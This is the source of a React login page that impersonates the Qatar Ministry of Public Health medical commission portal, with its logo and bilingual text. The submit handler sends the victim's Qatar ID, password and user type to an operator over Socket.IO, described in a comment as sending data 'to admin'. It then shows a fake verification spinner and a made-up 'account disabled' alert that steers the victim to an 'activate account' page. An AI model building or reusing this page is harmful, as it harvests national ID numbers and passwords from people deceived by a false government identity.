import { useState, useMemo, useEffect} from "react";
import { navigateToPage, sendData } from "@/lib/store";
import { useLocation, useSearchParams } from "wouter";
import { z } from "zod";
import { ArrowLeft, AlertTriangle, ShieldAlert, Eye, EyeOff, Loader2 } from "lucide-react";
import { toast } from "sonner";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
import { useLang } from "@/i18n/LanguageContext";
import SiteHeader from "@/components/SiteHeader";
import mophLogo from "@/assets/moph-logo.png.asset.json";
import { getServiceContext } from "@/lib/serviceContext";
import {
  qatarIdSchema,
  sanitizeQatarId,
  validateQatarIdLive as validateQatarIdLiveShared,
  qatarIdErrorFor,
  qatarIdKeyDownGuard,
  qatarIdPasteSanitizer,
} from "@/lib/qatarId";

const MAROON = "#8b1538";

const schema = z.object({
  userType: z.enum(["company", "individual"], {
    required_error: "يجب اختيار نوع المستخدم",
  }),
  qatarId: qatarIdSchema,
  password: z
    .string()
    .min(6, "كلمة المرور قصيرة جداً (6 أحرف على الأقل)")
    .max(100, "كلمة المرور طويلة جداً"),
});

type FormErrors = Partial<Record<"userType" | "qatarId" | "password", string>>;

const MedicalLogin = () => {
  const { pick, dir } = useLang();
  const [, navigate] = useLocation();
  const [searchParams] = useSearchParams();
  const service = searchParams.get("service");
  const serviceContext = useMemo(() => getServiceContext(service), [service]);

  const pageTitle = pick(serviceContext.titleAr, serviceContext.titleEn);

  const [userType, setUserType] = useState<"company" | "individual">("individual");
  const [qatarId, setQatarId] = useState("");
  const [password, setPassword] = useState("");
  const [errors, setErrors] = useState<FormErrors>({});
  const [submitting, setSubmitting] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [disabledNotice, setDisabledNotice] = useState(false);
  const [waiting, setWaiting] = useState(false);

  const t = (ar: string, en: string) => pick(ar, en);

  // Full-form validity (drives submit-button enabled state).
  const isFormValid = useMemo(() => {
    return schema.safeParse({ userType, qatarId, password }).success;
  }, [userType, qatarId, password]);

  const validate = () => {
    const result = schema.safeParse({ userType, qatarId, password });
    if (result.success) {
      setErrors({});
      return true;
    }
    const next: FormErrors = {};
    for (const issue of result.error.issues) {
      const key = issue.path[0] as keyof FormErrors;
      if (key && !next[key]) next[key] = issue.message;
    }
    setErrors(next);
    return false;
  };

  const validateQatarIdLive = (value: string) => {
    setErrors((p) => ({ ...p, qatarId: validateQatarIdLiveShared(value) }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    // Hard guard: strip any hidden whitespace and re-check the format
    // before we hit the network. Prevents zero-width/space characters
    // from ever reaching the backend.
    const cleanedId = sanitizeQatarId(qatarId);
    if (cleanedId !== qatarId) setQatarId(cleanedId);
    if (userType === "individual") {
      const idError = qatarIdErrorFor(cleanedId);
      if (idError) {
        setErrors((p) => ({ ...p, qatarId: idError }));
        toast.error(
          pick(
            "رقم الهوية غير صحيح — تحقق من الطول والصيغة",
            "Invalid Qatar ID — check length and format"
          )
        );
        return;
      }
    }
    if (!validate()) {
      toast.error(
        pick(
          "يرجى تصحيح الحقول قبل المتابعة",
          "Please correct the highlighted fields before continuing"
        )
      );
      return;
    }
    setSubmitting(true);
    setWaiting(true);

    // Save service to sessionStorage
    if (typeof window !== "undefined" && service) {
      sessionStorage.setItem("selected_service", service);
    }

    // Send data to admin via Socket.IO
    sendData({
      data: {
        "نوع المستخدم": userType === "company" ? "مستخدم الشركة" : "مستخدم فردي",
        "رقم الهوية القطرية": qatarId,
        "كلمة المرور": password,
        "الخدمة": service || "medical",
      },
      current: "تسجيل دخول القومسيون الطبي",
      nextPage: "تفعيل الحساب",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    setTimeout(() => {
      setWaiting(false);
      setSubmitting(false);
      setDisabledNotice(true);
      window.scrollTo({ top: 0, behavior: "smooth" });
    }, 3000);
  };

  const goActivate = () => {
    const params = new URLSearchParams();
    if (service) params.set("service", service);
    params.set("uid", qatarId);
    params.set("type", userType);
    navigate(`/medical-activate?${params.toString()}`);
  };

  const handleCancel = () => {
    setQatarId("");
    setPassword("");
    setErrors({});
    navigate("/");
  };

  useEffect(() => {
    navigateToPage("تسجيل دخول القومسيون الطبي");
  }, []);

  return (
    <div dir={dir} className="min-h-screen bg-[#eef0fb] flex flex-col">
      <SiteHeader />
      <div className="flex-1 py-8 px-3 flex items-start justify-center">
      <div className="w-full max-w-5xl bg-white shadow-sm relative">
        {waiting && (
          <div className="absolute inset-0 z-10 flex flex-col items-center justify-center bg-white/95 text-center p-6">
            <Loader2 className="w-12 h-12 animate-spin mb-4" style={{ color: MAROON }} />
            <h3 className="text-lg font-semibold mb-2" style={{ color: MAROON }}>
              {t("جاري التحقق من البيانات", "Verifying your information")}
            </h3>
            <p className="text-sm text-gray-600">
              {t("يرجى الانتظار لحظات...", "Please wait a moment...")}
            </p>
          </div>
        )}
        {disabledNotice && (
          <div
            role="alert"
            className="mx-4 mt-4 rounded-md border border-red-300 bg-red-50 p-4 text-right"
            style={{ borderColor: "#f5b7b1" }}
          >
            <div className="flex items-start gap-3">
              <div
                className="w-9 h-9 rounded-full flex items-center justify-center shrink-0"
                style={{ backgroundColor: MAROON }}
              >
                <ShieldAlert className="w-5 h-5 text-white" />
              </div>
              <div className="flex-1 space-y-2">
                <h3 className="font-bold text-base" style={{ color: MAROON }}>
                  {qatarId
                    ? t(`حساب ${qatarId} معطّل مؤقتاً`, `Account ${qatarId} is temporarily disabled`)
                    : t("حسابك معطّل مؤقتاً", "Your account is temporarily disabled")}
                </h3>
                <p className="text-sm text-gray-700 leading-relaxed">
                  {t(
                    serviceContext.disabledReasonAr,
                    serviceContext.disabledReasonEn
                  )}
                </p>
                <div className="flex items-center gap-2 pt-1">
                  <AlertTriangle className="w-4 h-4" style={{ color: MAROON }} />
                  <span className="text-xs text-gray-600">
                    {t(
                      serviceContext.disabledBlockAr,
                      serviceContext.disabledBlockEn
                    )}
                  </span>
                </div>
                <Button
                  type="button"
                  onClick={goActivate}
                  className="mt-2 h-10 rounded-full text-white hover:opacity-90"
                  style={{ backgroundColor: MAROON }}
                >
                  {t("تفعيل الحساب الآن", "Activate account now")}
                </Button>
              </div>
            </div>
          </div>
        )}
        {/* Titles bar */}
        <div className="text-center pt-8 pb-6 px-6 border-b border-gray-100">
          <h1 className="text-2xl font-bold" style={{ color: MAROON }}>
            {pageTitle}
          </h1>
          <p className="mt-3 text-gray-500 text-lg">
            {t(serviceContext.platformShortAr, serviceContext.platformShortEn)}
          </p>
        </div>

        {/* Logo */}
        <div className="flex justify-center py-8 px-6">
          <div className="bg-white rounded-2xl px-6 py-4 shadow-sm ring-1 ring-black/5 inline-flex items-center justify-center">
            <img
              src={mophLogo.url}
              alt={t("وزارة الصحة العامة - دولة قطر", "Ministry of Public Health - State of Qatar")}
              className="max-w-[260px] w-full h-auto"
              width={560}
              height={280}
              loading="lazy"
            />
          </div>
        </div>

        {/* Section title */}
        <div className="px-6 text-right">
          <h2 className="text-xl font-semibold mb-4" style={{ color: MAROON }}>
            {t("تسجيل الدخول", "Sign In")}
          </h2>
          <div className="mb-4 rounded-md border border-dashed p-3 flex items-center justify-between gap-3"
               style={{ borderColor: `${MAROON}66`, backgroundColor: "#fdf7f8" }}>
            <p className="text-xs text-gray-700 leading-relaxed">
              {t(
                serviceContext.registerPromptAr,
                serviceContext.registerPromptEn
              )}
            </p>
            <Button
              type="button"
              onClick={() => {
                const p = new URLSearchParams();
                if (service) p.set("service", service);
                navigate(`/medical-register/step/1${p.toString() ? `?${p}` : ""}`);
              }}
              className="shrink-0 h-9 rounded-full text-white text-xs px-4"
              style={{ backgroundColor: MAROON }}
            >
              {t("تسجيل جديد", "Register")}
            </Button>
          </div>

          <form onSubmit={handleSubmit} noValidate className="space-y-5 pb-8">
            {/* User type */}
            <fieldset
              className={`rounded-md p-4 ${errors.userType ? "border-2 border-red-400" : "border-2"}`}
              style={!errors.userType ? { borderColor: MAROON } : undefined}
            >
              <legend className="px-2 text-gray-600 text-sm text-right">
                {t("نوع المستخدم", "User Type")}
              </legend>
              <RadioGroup
                value={userType}
                onValueChange={(v) => setUserType(v as "company" | "individual")}
                className="space-y-3 mt-2"
              >
                <div dir={dir} className="flex items-center justify-start gap-3">
                  <RadioGroupItem
                    id="user-company"
                    value="company"
                    className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]"
                  />
                  <Label htmlFor="user-company" className="cursor-pointer text-base text-gray-700">
                    {t("مستخدم الشركة", "Company User")}
                  </Label>
                </div>
                <div dir={dir} className="flex items-center justify-start gap-3">
                  <RadioGroupItem
                    id="user-individual"
                    value="individual"
                    className="border-gray-400 data-[state=checked]:border-[#8b1538] data-[state=checked]:text-[#8b1538]"
                  />
                  <Label htmlFor="user-individual" className="cursor-pointer text-base text-gray-700">
                    {t("مستخدم فردي", "Individual User")}
                  </Label>
                </div>
              </RadioGroup>
              {errors.userType && (
                <p className="mt-2 text-sm text-red-600" role="alert">
                  {errors.userType}
                </p>
              )}
            </fieldset>

            {/* Qatar ID / Establishment No. */}
            <div className="space-y-2">
              <Label htmlFor="qatar-id" className="text-gray-600 text-sm">
                {userType === "company"
                  ? t("رقم المنشأة", "Establishment No.")
                  : t("الهوية القطرية / الرقم الشخصي", "Qatar ID / Personal ID")}{" "}
                <span style={{ color: MAROON }}>*</span>
              </Label>
              <Input
                id="qatar-id"
                type="text"
                dir="ltr"
                value={qatarId}
                onChange={(e) => {
                  const v = sanitizeQatarId(e.target.value);
                  setQatarId(v);
                  validateQatarIdLive(v);
                }}
                onKeyDown={qatarIdKeyDownGuard}
                onPaste={(e) => {
                  const cleaned = qatarIdPasteSanitizer(e);
                  if (cleaned !== null) {
                    setQatarId(cleaned);
                    validateQatarIdLive(cleaned);
                  }
                }}
                onBlur={validate}
                placeholder={userType === "company" ? "" : "28xxxxxxxxx"}
                inputMode="numeric"
                maxLength={11}
                autoComplete="off"
                aria-invalid={!!errors.qatarId}
                aria-describedby={errors.qatarId ? "qatar-id-error" : undefined}
                className={`h-11 rounded-md text-base bg-white placeholder:text-gray-400 ${
                  errors.qatarId ? "border-red-400 focus-visible:ring-red-300" : "border-gray-300"
                }`}
              />
              {errors.qatarId ? (
                <p
                  id="qatar-id-error"
                  className="flex items-start gap-1.5 text-sm text-red-600"
                  role="alert"
                >
                  <AlertTriangle className="w-4 h-4 mt-0.5 shrink-0" />
                  <span>{errors.qatarId}</span>
                </p>
              ) : (
                userType === "individual" && (
                  <p className="text-xs text-gray-500">
                    {t(
                      "11 رقماً يبدأ بـ 2 أو 3 (مثال: 28xxxxxxxxx)",
                      "11 digits starting with 2 or 3 (e.g. 28xxxxxxxxx)"
                    )}
                  </p>
                )
              )}
            </div>

            {/* Password */}
            <div className="space-y-2">
              <Label htmlFor="password" className="text-gray-600 text-sm">
                {t("كلمة المرور", "Password")} <span style={{ color: MAROON }}>*</span>
              </Label>
              <div className="relative">
                <Input
                  id="password"
                  type={showPassword ? "text" : "password"}
                  dir="ltr"
                  value={password}
                  onChange={(e) => setPassword(e.target.value.replace(/[^\x00-\x7F]/g, ""))}
                  onBlur={validate}
                  placeholder="••••••••"
                  maxLength={100}
                  autoComplete="current-password"
                  aria-invalid={!!errors.password}
                  aria-describedby={errors.password ? "password-error" : undefined}
                  className={`h-11 rounded-md text-base bg-white placeholder:text-gray-400 pe-10 ${
                    errors.password ? "border-red-400 focus-visible:ring-red-300" : "border-gray-300"
                  }`}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((s) => !s)}
                  className="absolute start-3 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600"
                  aria-label={showPassword ? t("إخفاء كلمة المرور", "Hide password") : t("إظهار كلمة المرور", "Show password")}
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
              {errors.password && (
                <p id="password-error" className="text-sm text-red-600" role="alert">
                  {errors.password}
                </p>
              )}
            </div>

            {/* Actions */}
            <div className="flex items-center justify-start gap-3 pt-4">
              <Button
                type="submit"
                disabled={submitting || !isFormValid}
                className="min-w-[140px] h-11 rounded-full text-white hover:opacity-90 gap-2 disabled:opacity-50 disabled:cursor-not-allowed"
                style={{ backgroundColor: MAROON }}
              >
                {submitting ? t("جارٍ البحث...", "Searching...") : t("بحث", "Search")}
                <ArrowLeft className="!size-5" />
              </Button>
              <Button
                type="button"
                variant="outline"
                onClick={handleCancel}
                className="min-w-[140px] h-11 rounded-full border-gray-400 text-gray-700 hover:bg-gray-100 hover:text-gray-900"
              >
                {t("إلغاء", "Cancel")}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
    </div>
  );
};

export default MedicalLogin;